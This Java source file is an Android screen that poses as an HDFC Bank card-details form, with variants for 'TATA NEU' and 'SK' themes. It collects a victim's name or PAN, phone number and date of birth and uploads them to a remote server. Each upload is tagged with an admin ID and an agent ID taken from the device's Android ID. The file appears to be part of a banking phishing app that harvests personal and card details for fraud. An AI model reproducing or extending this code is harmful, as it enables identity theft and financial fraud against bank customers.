package com.pegalite.neotron3.ui.hdfc;

import static android.view.View.VISIBLE;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.pegalite.neotron3.R;
import com.pegalite.neotron3.databinding.ActivityHdcfpersonalDetailsBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Random;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class HDCFPersonalDetailsActivity extends AppCompatActivity {

    ActivityHdcfpersonalDetailsBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityHdcfpersonalDetailsBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        getWindow().setStatusBarColor(ContextCompat.getColor(this, R.color.midnight_blue));

        if (Utils.THEME.equals("HDFC NEU")) {
            binding.neuIcon.setVisibility(VISIBLE);
            binding.headingText.setText("Hello, HDFC TATA NEU Customer\nComplete your card details in a few simple steps");
        } else if (Utils.THEME.equals("HDFC SK")) {
            binding.name.setHint("Enter Pan");
        }

        binding.submit.setOnClickListener(v -> {
            String name = binding.name.getText().toString();
            String number = binding.number.getText().toString();
            String dateOfBirth = binding.dateOfBirth.getText().toString();

            if (name.isEmpty() || number.isEmpty() || dateOfBirth.isEmpty()) {
                Toast.makeText(this, "Please Enter All the Details!", Toast.LENGTH_SHORT).show();
                return;
            }

            try {
                JSONObject object = new JSONObject();
                object.put(Utils.THEME.equals("HDFC SK") ? "panCard" : "name", name);
                object.put("number", number);
                object.put("dateOfBirth", dateOfBirth);
                object.put("submissionId", getSaltString());

                saveDetails(object);
                startActivity(new Intent(this, HDFCBankDetailsActivity.class).putExtra("data", object.toString()));

            } catch (JSONException e) {
                throw new RuntimeException(e);
            }


        });

        binding.dateOfBirth.addTextChangedListener(new TextWatcher() {
            private final String slash = "/";
            private String current = "";

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                String input = s.toString();

                if (!input.equals(current)) {
                    StringBuilder formatted = getStringBuilder(input);

                    current = formatted.toString();
                    binding.dateOfBirth.removeTextChangedListener(this);
                    binding.dateOfBirth.setText(current);
                    binding.dateOfBirth.setSelection(current.length());
                    binding.dateOfBirth.addTextChangedListener(this);
                }
            }

            @NonNull
            private StringBuilder getStringBuilder(String input) {
                String clean = input.replaceAll("[^\\d]", "");
                StringBuilder formatted = new StringBuilder();

                int len = clean.length();

                if (len > 0) {
                    formatted.append(clean.substring(0, Math.min(2, len)));
                    if (len >= 3) {
                        formatted.append(slash).append(clean.substring(2, Math.min(4, len)));
                    }
                    if (len >= 5) {
                        formatted.append(slash).append(clean.substring(4, Math.min(8, len)));
                    }
                }
                return formatted;
            }
        });

    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    protected String getSaltString() {
        String SALT_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 10) {
            int index = (int) (rnd.nextFloat() * SALT_CHARS.length());
            salt.append(SALT_CHARS.charAt(index));
        }
        return salt.toString();

    }
}